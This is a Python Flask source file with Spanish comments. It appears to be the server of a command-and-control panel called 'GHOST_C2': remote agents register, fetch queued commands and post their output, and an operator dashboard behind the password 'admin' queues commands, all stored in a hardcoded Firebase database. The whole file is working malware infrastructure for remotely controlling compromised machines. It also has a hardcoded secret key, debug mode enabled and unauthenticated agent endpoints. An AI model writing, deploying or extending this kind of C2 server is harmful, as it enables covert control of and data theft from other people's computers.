
import os
import json
import requests
from flask import Flask, render_template, request, redirect, url_for, session, jsonify
from datetime import datetime
from functools import wraps

app = Flask(__name__)
app.secret_key = "GHOST_C2_ULTRA_SECRET_KEY_99"

# --- CONFIGURACIÓN FIREBASE DIRECTA (REST) ---
DB_URL = "https://holaaa-2ca32-default-rtdb.europe-west1.firebasedatabase.app"

def db_get(path):
    try:
        r = requests.get(f"{DB_URL}/{path}.json")
        return r.json() or {}
    except:
        return {}

def db_update(path, data):
    try:
        requests.patch(f"{DB_URL}/{path}.json", json=data)
        return True
    except:
        return False

# --- DECORADOR ---
def login_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if not session.get('logged_in'):
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated

# --- WEB ---
@app.route('/')
@login_required
def index():
    return render_template('dashboard.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        if request.form.get('password') == 'admin':
            session['logged_in'] = True
            return redirect(url_for('index'))
    return render_template('login.html')

# --- API AGENTE (Corregida según tus logs) ---
@app.route('/api/v1/agent/register', methods=['POST'])
def agent_register():
    data = request.json
    agent_id = data.get('agent_id')
    if agent_id:
        data['last_seen'] = datetime.utcnow().isoformat()
        db_update(f'agents/{agent_id}', data)
        return jsonify({"status": "success"})
    return jsonify({"status": "error"}), 400

@app.route('/api/v1/agent/command/<agent_id>', methods=['GET'])
def agent_get_command(agent_id):
    agent_data = db_get(f'agents/{agent_id}')
    command = agent_data.get('pending_command', '')
    if command:
        db_update(f'agents/{agent_id}', {"pending_command": ""})
        return jsonify({"command": command})
    return jsonify({"command": ""})

@app.route('/api/v1/agent/result', methods=['POST'])
def agent_post_result():
    data = request.json
    agent_id = data.get('agent_id')
    if agent_id:
        entry = {"timestamp": datetime.utcnow().isoformat(), "output": data.get('output', '')}
        requests.post(f"{DB_URL}/results/{agent_id}.json", json=entry)
        return jsonify({"status": "success"})
    return jsonify({"status": "error"}), 400

# API PANEL
@app.route('/api/v1/agents', methods=['GET'])
@login_required
def api_get_agents():
    return jsonify(db_get('agents'))

@app.route('/api/v1/results/<agent_id>', methods=['GET'])
@login_required
def api_get_results(agent_id):
    if agent_id == "all":
        return jsonify(db_get('results'))
    return jsonify(db_get(f'results/{agent_id}'))

@app.route('/api/v1/command', methods=['POST'])
@login_required
def api_send_command():
    data = request.json
    agent_id = data.get('agent_id')
    command = data.get('command')
    if agent_id and command:
        db_update(f'agents/{agent_id}', {"pending_command": command})
        return jsonify({"status": "success"})
    return jsonify({"status": "error"}), 400

if __name__ == '__main__':
    app.run(debug=True, port=5000)
